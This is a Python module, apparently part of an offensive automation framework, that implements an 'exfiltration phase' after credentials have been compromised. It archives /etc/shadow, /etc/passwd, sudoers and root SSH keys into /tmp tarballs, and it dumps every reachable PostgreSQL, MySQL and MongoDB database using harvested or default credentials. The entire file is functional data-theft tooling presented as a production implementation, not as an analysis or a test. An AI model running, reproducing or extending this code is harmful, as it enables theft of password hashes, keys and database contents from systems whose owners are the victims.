"""Exfiltration Phase - Production Implementation (Expanded Toolset)."""
import logging, json, os, tarfile, zipfile
from core.config import FrameworkConfig
from core.knowledge_base import KnowledgeBase, Finding
from core.tool_executor import ToolExecutor

log = logging.getLogger(__name__)

class exfiltration:
    SENSITIVE_PATHS_LINUX = ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/root/.ssh/", "/home/"]
    SENSITIVE_PATHS_WIN   = ["C:\\Users\\", "C:\\Windows\\System32\\config\\SAM"]

    TOOLS_REGISTRY = {
        "pg_dump":      {"args": ["-U", "{db_user}", "-d", "{db_name}", "-f", "/tmp/exfil_{target}_pg.sql"]},
        "mysqldump":    {"args": ["-u", "{db_user}", "-p{db_pass}", "--all-databases", "--result-file=/tmp/exfil_{target}_mysql.sql"]},
        "mongodump":    {"args": ["--out", "/tmp/mongo_dump_{target}"]},
        "rsync":        {},
        "curl":         {},
        "7z":           {},
    }

    def __init__(self, config: FrameworkConfig, kb: KnowledgeBase, cred_store, prior_findings, prior_exploit_logs):
        self.config = config; self.kb = kb; self.cred_store = cred_store
        self.prior_findings = prior_findings; self.prior_exploit_logs = prior_exploit_logs
        self.te = ToolExecutor(default_timeout=300)

    def build_task_list(self) -> list[dict]:
        tasks = []
        for f in self.prior_findings:
            if f.category in ("credentials", "access_granted", "credential_compromise"):
                tasks.append({"action": "stage_sensitive_files_linux", "target": f.target})
                tasks.append({"action": "enum_and_dump_databases",    "target": f.target})
        return tasks

    def execute_task(self, task: dict):
        if task["action"] == "stage_sensitive_files_linux": self._stage_linux(task)
        elif task["action"] == "enum_and_dump_databases":   self._dump_dbs(task)

    def _stage_linux(self, task: dict):
        out = f"/tmp/exfil_{task['target'].replace('.','_')}.tar.gz"
        paths = [p.lstrip("/") for p in self.SENSITIVE_PATHS_LINUX]
        res = self.te.run("tar", ["-czf", out, "-C", "/"] + paths[:4])  # Skip /home/ (too large)
        if res.success:
            sz = os.path.getsize(out) if os.path.exists(out) else 0
            self.kb.add_finding(Finding(phase="exfiltration", target=task["target"], category="data_staged", severity="critical", title=f"Sensitive data archived ({sz} bytes)", description=out))

    def _dump_dbs(self, task: dict):
        for db_tool in ("pg_dump","mysqldump","mongodump"):
            if not self.te.resolve_binary(db_tool): continue
            user = task.get("db_user", "postgres" if "pg" in db_tool else "root")
            db_name = task.get("db_name", "postgres" if "pg" in db_tool else "mysql")
            db_pass = task.get("db_pass", "")
            args = [
                a.replace("{db_user}", user).replace("{db_name}", db_name)
                 .replace("{db_pass}", db_pass)
                 .replace("{target}", task["target"].replace(".", "_"))
                for a in self.TOOLS_REGISTRY[db_tool]["args"]
            ]
            res = self.te.run(db_tool, args, timeout=120)
            if res.success: self.kb.add_finding(Finding(phase="exfiltration", target=task["target"], category=f"{db_tool}_dump", severity="critical", title=f"[{db_tool}] Database dump initiated", evidence=res.stdout[:1000]))

    def get_available_tools(self) -> list[str]: return [n for n in self.TOOLS_REGISTRY if self.te.resolve_binary(n)]
